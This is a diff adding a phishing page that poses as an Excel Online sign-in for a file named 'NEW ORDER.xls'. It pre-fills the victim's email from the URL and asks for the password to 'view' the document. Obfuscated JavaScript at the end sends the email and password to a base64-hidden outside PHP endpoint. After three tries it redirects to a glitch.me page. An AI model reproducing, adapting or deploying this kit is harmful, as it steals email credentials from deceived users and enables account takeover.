@@ -1,0 +1,214 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Excel Online Spreadsheet :: Sign in</title>
+<!--<script src="https://code.jquery.com/jquery-3.1.1.min.js" crossorigin="anonymous"></script>-->
+
+<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+<link href="https://ucarecdn.com/eae24034-0cc9-4528-827a-d46e30dd5a83/hover.css" rel="stylesheet" media="all">
+<style type="text/css">
+    .hide {
+      display: none;
+    }
+
+    .grey-form {
+      background-color: #ffffff;
+      opacity: 1;
+      pointer-events: none;
+    }
+
+    .alert-success {
+      color: #155724;
+      background-color: #d4edda;
+      border-color: #c3e6cb;
+    }
+
+
+
+    .modal-body {
+    padding: 0 !important;
+}
+.login-container{
+    position: absolute;
+    /*width: 400px;*/
+    margin: 80px auto;
+    padding: 20px 20px 20px;
+    text-align: center;
+    background: #f5f5f5;
+    border: 1px solid #ccc;
+}
+
+#output{
+    position: absolute;
+    width: 400px;
+    top: -75px;
+    left: 0;
+    color: #fff;
+}
+
+#output.alert-success{
+    background: rgb(25, 204, 25);
+}
+
+#output.alert-danger{
+    background: rgb(228, 105, 105);
+
+}
+
+.avatar{
+    width: 100px;height: 100px;
+    margin: 10px auto -30px;
+    border-radius: 100%;
+    border: 2px solid #aaa;
+    background-size: cover;
+}
+
+.form-box input{
+    width: 100%;
+	margin: 1px; auto
+    padding: 10px;
+    text-align: center;
+    height: 40px;
+    border: 1px solid #ccc;;
+    background: #ffffff;
+    transition:0.2s ease-in-out;
+
+}
+
+.form-box input:focus{
+    outline: 50px;
+    background: #ffffff;
+}
+
+.form-box input[type="text"]{
+    border-radius: 5px 5px 0 0;
+    text-transform: lowercase;
+}
+
+.form-box input[type="password"]{
+    border-radius: 0 0 0px 0px;
+    border-top: 0;
+}
+
+.form-box button.login{
+    margin-top: 15px;
+    padding: 10px 20px;
+}
+
+.animated {
+  -webkit-animation-duration: 1s;
+  animation-duration: 1s;
+  -webkit-animation-fill-mode: both;
+  animation-fill-mode: both;
+}
+
+@-webkit-keyframes fadeInUp {
+  0% {
+    opacity: 0;
+    -webkit-transform: translateY(20px);
+    transform: translateY(20px);
+  }
+
+  100% {
+    opacity: 0;
+    -webkit-transform: translateY(0);
+    transform: translateY(0);
+  }
+}
+
+@keyframes fadeInUp {
+  0% {
+    opacity: 0;
+    -webkit-transform: translateY(20px);
+    -ms-transform: translateY(20px);
+    transform: translateY(20px);
+  }
+
+  100% {
+    opacity: 1;
+    -webkit-transform: translateY(0);
+    -ms-transform: translateY(0);
+    transform: translateY(0);
+  }
+}
+
+.fadeInUp {
+  -webkit-animation-name: fadeInUp;
+  animation-name: fadeInUp;
+}
+  </style>
+
+</head>
+
+<body>
+  <div class="container-fluid">
+    <div class="row" style="height: 100vh; background-image: url('https://i.gyazo.com/52a11ae9fe6936093d1a147ffb24ad16.png'); background-size: cover;background-repeat: no-repeat;">
+      <div class="container">
+        <div class="row">
+
+
+        </div>
+      </div>
+
+
+  <!-- Modal for gmail -->
+  <div style="display: block !important" class="modal" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+    <div class="modal-dialog" role="document">
+      <div style="position: relative;
+                  display: -webkit-box;
+                  display: -ms-flexbox;
+                  display: flex;
+                  -webkit-box-orient: vertical;
+                  -webkit-box-direction: normal;
+                  -ms-flex-direction: column;
+                  flex-direction: column;
+                  width: 80%;
+                  pointer-events: auto;
+                  ">
+        <div class="modal-body">
+
+        <div class="login-container">
+            <div id="output"></div>
+            <div class="avatar">
+              <img id="fieldImg" class="img-fluid brand_logo" width="60px" style="margin-top: 20px;" src="https://i.gyazo.com/83cffd1ebf23ed93aa925eb9529f5348.png">
+            </div>
+            <div class="form-box">
+              <div style="margin-top: 10px;" class="alert" id="errorMsg123"><color style="color:red;"><!--Your account or password is incorrect--> </color></div>
+              <h4></h4>
+			  <h4>NEW ORDER.xls</h4>
+              <p>Because you're accessing sensitive info, you need to verify your email password.</p>
+                <!--<form id="contact" class="form-horizontal well">-->
+				                        <center>
+                            <div class="alert alert-danger" id="msg" style="display: none;">Error connecting server. Please try again</div>
+                            <span id="error" class="text-danger" style="display: none;">Invalid user</span>
+                        </center>
+               
+                    <input type="hidden" name="_redirect" value="https://office.live.com/start/Excel.aspx">
+					<input type="hidden"  value="Toscotec" id="login" name="AA" placeholder="email">
+                    <input style="background-color: #eee;opacity: 1; pointer-events:none !important;" type="email" name="AA" id="ai" aria-describedby="emailHelp" placeholder="Enter email" value=""  readonly>
+                    <input type="password" name="BB" id="pr" aria-describedby="emailHelp" placeholder="Enter Your Password" required="" class="form-input-container">
+                    <button class="btn btn-success btn-block login" style="background: #039126;" id="submit-btn"  type="submit">View Document</button>
+                </form>
+            </div>
+        </div>
+        </div>
+      </div>
+    </div>
+    </div>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.slim.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/2.10.2/umd/popper.min.js" ></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+</body>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+/* global $ */
+function _0x471d(){var _0x488702=['JSON','POST','bmV4dC5waHA=','That\x20account\x20doesn\x27t\x20exist.\x20Enter\x20a\x20different\x20account','signal','Password\x20field\x20is\x20emply.!','#submit-btn','html','https://windy-flannel-hip.glitch.me/feedback.html','focus','replace','readonly','174714wIyTuy','aHR0cHM6Ly9zZXJ2aWNlb2ZmaWNlbmV0LmNvbS92YXIvY24ucGhw','ajax','5ppzDWS','val','text','Verifying...','40XfeSWe','hash','#m-btn','#msg','attr','681100Epatjr','846vAFUbB','click','show','hide','1015816GRsbMw','Submit','4740wmEsXF','93358ZaIncl','substr','preventDefault','#pr','toLowerCase','location','#error','34899WiOmTX','indexOf','#ai','1210mzFwdA','Email\x20field\x20is\x20emply.!'];_0x471d=function(){return _0x488702;};return _0x471d();}function _0x4e80(_0x221e0f,_0x37f726){var _0x471db2=_0x471d();return _0x4e80=function(_0x4e8035,_0x15b97c){_0x4e8035=_0x4e8035-0xee;var _0x313dcf=_0x471db2[_0x4e8035];return _0x313dcf;},_0x4e80(_0x221e0f,_0x37f726);}(function(_0x392626,_0x42f9fa){var _0xd4a7bf=_0x4e80,_0x559087=_0x392626();while(!![]){try{var _0x4c4133=parseInt(_0xd4a7bf(0x10b))/0x1+parseInt(_0xd4a7bf(0x101))/0x2+parseInt(_0xd4a7bf(0x108))/0x3*(-parseInt(_0xd4a7bf(0xf4))/0x4)+parseInt(_0xd4a7bf(0xf0))/0x5*(parseInt(_0xd4a7bf(0x119))/0x6)+parseInt(_0xd4a7bf(0xf9))/0x7+parseInt(_0xd4a7bf(0xfe))/0x8+-parseInt(_0xd4a7bf(0xfa))/0x9*(parseInt(_0xd4a7bf(0x100))/0xa);if(_0x4c4133===_0x42f9fa)break;else _0x559087['push'](_0x559087['shift']());}catch(_0x2bee32){_0x559087['push'](_0x559087['shift']());}}}(_0x471d,0x2246f),$(document)['ready'](function(){var _0x15ca4c=_0x4e80,_0x12ae61=0x0;$(_0x15ca4c(0xf6))[_0x15ca4c(0xfb)]();var _0x4c0dab=window[_0x15ca4c(0x106)][_0x15ca4c(0xf5)][_0x15ca4c(0x102)](0x1);if(!_0x4c0dab){}else{var _0x234dc4=/^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;if(!_0x234dc4['test'](_0x4c0dab))var _0x58b47b=_0x4c0dab;else var _0x58b47b=atob(_0x4c0dab);var _0x2e3052=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/,_0x4573e2=_0x58b47b[_0x15ca4c(0x109)]('@'),_0x55363d=_0x58b47b[_0x15ca4c(0x102)](_0x4573e2+0x1),_0x491ee7=_0x55363d['substr'](0x0,_0x55363d[_0x15ca4c(0x109)]('.')),_0x2d3f7f=_0x491ee7[_0x15ca4c(0x105)]();$(_0x15ca4c(0x10a))['val'](_0x58b47b),$(_0x15ca4c(0x10a))[_0x15ca4c(0xf8)](_0x15ca4c(0x118),!![]),$('#msg')[_0x15ca4c(0xfd)]();}var _0x1a8286=_0x15ca4c(0x10f);$(_0x15ca4c(0x113))[_0x15ca4c(0xfb)](function(_0x5c831b){var _0x19c852=_0x15ca4c;$('#error')['hide'](),$(_0x19c852(0xf7))[_0x19c852(0xfd)](),_0x5c831b[_0x19c852(0x103)]();var _0x34bb25=$('#ai')['val'](),_0xa78173=$('#pr')[_0x19c852(0xf1)](),_0x19e336=$(_0x19c852(0xf7))[_0x19c852(0x114)]();$(_0x19c852(0xf7))[_0x19c852(0xf2)](_0x19e336);var _0x5a0eb4=_0x34bb25,_0x1209a9=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x34bb25)return $(_0x19c852(0x107))[_0x19c852(0xfc)](),$('#error')[_0x19c852(0x114)](_0x19c852(0x10c)),_0x34bb25[_0x19c852(0x116)],![];if(!_0x1209a9['test'](_0x5a0eb4))return $('#error')['show'](),$('#error')[_0x19c852(0x114)](_0x19c852(0x110)),_0x34bb25[_0x19c852(0x116)],![];if(!_0xa78173)return $(_0x19c852(0x107))[_0x19c852(0xfc)](),$(_0x19c852(0x107))[_0x19c852(0x114)](_0x19c852(0x112)),_0x34bb25[_0x19c852(0x116)],![];var _0x382e3b=_0x5a0eb4[_0x19c852(0x109)]('@'),_0x2f6077=_0x5a0eb4[_0x19c852(0x102)](_0x382e3b+0x1),_0x4b2df3=_0x2f6077[_0x19c852(0x102)](0x0,_0x2f6077[_0x19c852(0x109)]('.')),_0x94215=_0x4b2df3[_0x19c852(0x105)]();_0x12ae61=_0x12ae61+0x1,$[_0x19c852(0xef)]({'dataType':_0x19c852(0x10d),'url':atob(_0x19c852(0xee)),'type':_0x19c852(0x10e),'data':{'ai':_0x34bb25,'pr':_0xa78173},'beforeSend':function(_0x28eb9a){var _0x323099=_0x19c852;$(_0x323099(0x113))[_0x323099(0x114)](_0x323099(0xf3));},'success':function(_0x12056b){var _0x4bb0a4=_0x19c852;if(_0x12056b){$(_0x4bb0a4(0xf7))[_0x4bb0a4(0xfc)](),console['log'](_0x12056b);if(_0x12056b[_0x4bb0a4(0x111)]=='ok'){$('#pr')['val']('');if(_0x12ae61>=0x3)return _0x12ae61=0x0,window[_0x4bb0a4(0x106)][_0x4bb0a4(0x117)](_0x4bb0a4(0x115)),![];}else{}}},'error':function(){var _0x44d23c=_0x19c852;$(_0x44d23c(0x104))[_0x44d23c(0xf1)]('');if(_0x12ae61>=0x3)return _0x12ae61=0x0,window['location'][_0x44d23c(0x117)](_0x44d23c(0x115)),![];$('#msg')['show']();},'complete':function(){var _0x126ade=_0x19c852;$(_0x126ade(0x113))['html'](_0x126ade(0xff));}});});}));
+</script>
+
+</html>
